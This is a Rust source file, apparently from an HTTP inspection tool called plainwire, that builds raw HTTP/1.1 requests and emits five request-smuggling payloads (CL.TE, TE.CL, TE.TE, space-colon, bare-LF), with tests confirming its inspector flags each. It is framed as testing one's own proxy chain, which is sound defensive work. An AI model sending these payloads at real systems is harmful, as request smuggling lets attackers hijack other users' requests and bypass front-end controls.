//! Craft raw HTTP/1.1 requests, including deliberately ambiguous gadgets.
//!
//! This is the write half of the tool: assemble a byte-exact request from a
//! spec (real CRLFs, an auto-computed Content-Length, or a chunked body), and
//! emit well-known desync gadgets for testing your **own** proxy chain. The
//! output is raw wire bytes, so it pipes straight into netcat:
//! `plainwire craft --smuggle cl.te | nc 127.0.0.1 80`. Feed the same bytes
//! back into `plainwire inspect -` and the corresponding findings light up.

/// How to set Content-Length on a crafted request.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClMode {
    /// Add `Content-Length: <body length>` when a body is present.
    Auto,
    /// Never add a Content-Length header.
    Omit,
    /// Force an exact value (may deliberately mismatch the body).
    Explicit(usize),
}

/// A request to assemble.
#[derive(Debug, Clone)]
pub struct CraftSpec {
    pub method: String,
    pub target: String,
    pub version: String,
    pub host: String,
    /// Extra headers in order.
    pub headers: Vec<(String, String)>,
    pub body: Vec<u8>,
    /// Encode the body with `Transfer-Encoding: chunked`.
    pub chunked: bool,
    pub content_length: ClMode,
}

impl Default for CraftSpec {
    fn default() -> Self {
        CraftSpec {
            method: "GET".to_string(),
            target: "/".to_string(),
            version: "HTTP/1.1".to_string(),
            host: "example.test".to_string(),
            headers: Vec::new(),
            body: Vec::new(),
            chunked: false,
            content_length: ClMode::Auto,
        }
    }
}

fn crlf(out: &mut Vec<u8>) {
    out.extend_from_slice(b"\r\n");
}

fn line(out: &mut Vec<u8>, s: &str) {
    out.extend_from_slice(s.as_bytes());
    crlf(out);
}

/// Assemble a request from `spec` into raw wire bytes.
pub fn build(spec: &CraftSpec) -> Vec<u8> {
    let mut out = Vec::new();
    line(
        &mut out,
        &format!("{} {} {}", spec.method, spec.target, spec.version),
    );

    let has_host = spec
        .headers
        .iter()
        .any(|(k, _)| k.eq_ignore_ascii_case("host"));
    if !has_host && !spec.host.is_empty() {
        line(&mut out, &format!("Host: {}", spec.host));
    }
    for (k, v) in &spec.headers {
        line(&mut out, &format!("{k}: {v}"));
    }

    if spec.chunked {
        line(&mut out, "Transfer-Encoding: chunked");
        crlf(&mut out); // end of headers
        if !spec.body.is_empty() {
            out.extend_from_slice(format!("{:x}", spec.body.len()).as_bytes());
            crlf(&mut out);
            out.extend_from_slice(&spec.body);
            crlf(&mut out);
        }
        out.extend_from_slice(b"0\r\n\r\n");
        return out;
    }

    match spec.content_length {
        ClMode::Auto => {
            if !spec.body.is_empty() {
                line(&mut out, &format!("Content-Length: {}", spec.body.len()));
            }
        }
        ClMode::Explicit(n) => line(&mut out, &format!("Content-Length: {n}")),
        ClMode::Omit => {}
    }
    crlf(&mut out); // end of headers
    out.extend_from_slice(&spec.body);
    out
}

/// A named request-smuggling gadget.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Gadget {
    /// Front-end honours Content-Length, back-end honours Transfer-Encoding.
    ClTe,
    /// Front-end honours Transfer-Encoding, back-end honours Content-Length.
    TeCl,
    /// Two Transfer-Encoding headers, one obfuscated (parsers disagree).
    TeTe,
    /// Whitespace before the colon hides Transfer-Encoding from strict parsers.
    SpaceColon,
    /// A bare LF terminator hides the header from CRLF-strict parsers.
    BareLf,
}

impl Gadget {
    /// Parse a gadget name (as passed to `--smuggle`).
    pub fn parse(name: &str) -> Option<Gadget> {
        match name.to_ascii_lowercase().as_str() {
            "cl.te" | "clte" => Some(Gadget::ClTe),
            "te.cl" | "tecl" => Some(Gadget::TeCl),
            "te.te" | "tete" => Some(Gadget::TeTe),
            "space-colon" | "spacecolon" => Some(Gadget::SpaceColon),
            "bare-lf" | "barelf" => Some(Gadget::BareLf),
            _ => None,
        }
    }

    /// All gadget names, for help text and `codes`-style listings.
    pub fn all() -> &'static [(&'static str, &'static str)] {
        &[
            (
                "cl.te",
                "Content-Length front-end, Transfer-Encoding back-end",
            ),
            (
                "te.cl",
                "Transfer-Encoding front-end, Content-Length back-end",
            ),
            ("te.te", "duplicate Transfer-Encoding, one obfuscated"),
            (
                "space-colon",
                "whitespace before the colon on Transfer-Encoding",
            ),
            ("bare-lf", "bare LF line ending on Transfer-Encoding"),
        ]
    }
}

/// Emit the raw bytes of a smuggling gadget. `host` and `target` customise the
/// request line and Host header; the framing payload is fixed so the gadget
/// stays a faithful, minimal proof of concept.
pub fn gadget(g: Gadget, host: &str, target: &str) -> Vec<u8> {
    match g {
        // CL=6 equals the length of "0\r\n\r\nG": the CL hop forwards all 6
        // bytes, the TE hop stops at the 0-chunk and leaves "G" as the next
        // request's first byte.
        Gadget::ClTe => format!(
            "POST {target} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
        )
        .into_bytes(),
        // CL=3 equals the length of "8\r\n": the CL hop stops there while the
        // TE hop consumes the whole chunked body.
        Gadget::TeCl => format!(
            "POST {target} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"
        )
        .into_bytes(),
        // The obfuscated coding comes first so a lenient parser still frames
        // the body as chunked while flagging the duplicate + obfuscation.
        Gadget::TeTe => format!(
            "POST {target} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n"
        )
        .into_bytes(),
        Gadget::SpaceColon => format!(
            "POST {target} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nG"
        )
        .into_bytes(),
        // The Transfer-Encoding line ends with a bare LF (\n) rather than CRLF.
        Gadget::BareLf => format!(
            "POST {target} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\n\r\n0\r\n\r\nG"
        )
        .into_bytes(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyze;
    use crate::message::{Framing, ParseMode};

    fn codes_of(raw: &[u8]) -> Vec<&'static str> {
        analyze(raw, ParseMode::Request)
            .findings
            .iter()
            .map(|f| f.code)
            .collect()
    }

    #[test]
    fn default_get_has_no_content_length() {
        let out = build(&CraftSpec::default());
        let text = String::from_utf8(out).unwrap();
        assert_eq!(text, "GET / HTTP/1.1\r\nHost: example.test\r\n\r\n");
    }

    #[test]
    fn auto_content_length_matches_body() {
        let spec = CraftSpec {
            method: "POST".to_string(),
            body: b"hello".to_vec(),
            ..Default::default()
        };
        let out = build(&spec);
        let text = String::from_utf8(out).unwrap();
        assert!(text.contains("Content-Length: 5\r\n"));
        assert!(text.ends_with("\r\n\r\nhello"));
    }

    #[test]
    fn crafted_request_round_trips_cleanly() {
        // A well-formed craft must produce zero findings when inspected.
        let spec = CraftSpec {
            method: "POST".to_string(),
            body: b"payload".to_vec(),
            ..Default::default()
        };
        let out = build(&spec);
        assert!(codes_of(&out).is_empty(), "found: {:?}", codes_of(&out));
    }

    #[test]
    fn explicit_content_length_can_mismatch() {
        let spec = CraftSpec {
            method: "POST".to_string(),
            body: b"hello".to_vec(),
            content_length: ClMode::Explicit(2),
            ..Default::default()
        };
        let out = build(&spec);
        assert!(String::from_utf8(out.clone())
            .unwrap()
            .contains("Content-Length: 2"));
        // Inspecting it flags the trailing bytes.
        assert!(codes_of(&out).contains(&"PW017"));
    }

    #[test]
    fn chunked_encodes_body_and_terminator() {
        let spec = CraftSpec {
            method: "POST".to_string(),
            body: b"hello".to_vec(),
            chunked: true,
            ..Default::default()
        };
        let out = build(&spec);
        let text = String::from_utf8(out.clone()).unwrap();
        assert!(text.contains("Transfer-Encoding: chunked\r\n"));
        assert!(text.contains("5\r\nhello\r\n0\r\n\r\n"));
        let a = analyze(&out, ParseMode::Request);
        assert_eq!(a.message.body.framing, Framing::Chunked);
        assert!(a.findings.is_empty());
    }

    #[test]
    fn extra_host_header_is_not_duplicated() {
        let spec = CraftSpec {
            headers: vec![("Host".to_string(), "override.test".to_string())],
            ..Default::default()
        };
        let out = String::from_utf8(build(&spec)).unwrap();
        assert_eq!(out.matches("Host:").count(), 1);
        assert!(out.contains("Host: override.test"));
    }

    #[test]
    fn gadget_names_parse() {
        assert_eq!(Gadget::parse("cl.te"), Some(Gadget::ClTe));
        assert_eq!(Gadget::parse("TE.CL"), Some(Gadget::TeCl));
        assert_eq!(Gadget::parse("bare-lf"), Some(Gadget::BareLf));
        assert_eq!(Gadget::parse("nope"), None);
    }

    #[test]
    fn cl_te_gadget_flags_both_and_trailing() {
        let out = gadget(Gadget::ClTe, "example.test", "/");
        let c = codes_of(&out);
        assert!(c.contains(&"PW001"), "codes: {c:?}");
        assert!(c.contains(&"PW017"));
    }

    #[test]
    fn te_cl_gadget_is_chunked_with_both_headers() {
        let out = gadget(Gadget::TeCl, "example.test", "/");
        let c = codes_of(&out);
        assert!(c.contains(&"PW001"));
        assert_eq!(
            analyze(&out, ParseMode::Request).message.body.framing,
            Framing::Chunked
        );
    }

    #[test]
    fn te_te_gadget_flags_duplicate_and_obfuscation() {
        let out = gadget(Gadget::TeTe, "example.test", "/");
        let c = codes_of(&out);
        assert!(c.contains(&"PW004"), "codes: {c:?}");
        assert!(c.contains(&"PW006"));
    }

    #[test]
    fn space_colon_gadget_flags_pw007_and_pw001() {
        let out = gadget(Gadget::SpaceColon, "example.test", "/");
        let c = codes_of(&out);
        assert!(c.contains(&"PW007"));
        assert!(c.contains(&"PW001"));
    }

    #[test]
    fn bare_lf_gadget_flags_pw008_and_pw001() {
        let out = gadget(Gadget::BareLf, "example.test", "/");
        let c = codes_of(&out);
        assert!(c.contains(&"PW008"), "codes: {c:?}");
        assert!(c.contains(&"PW001"));
    }
}
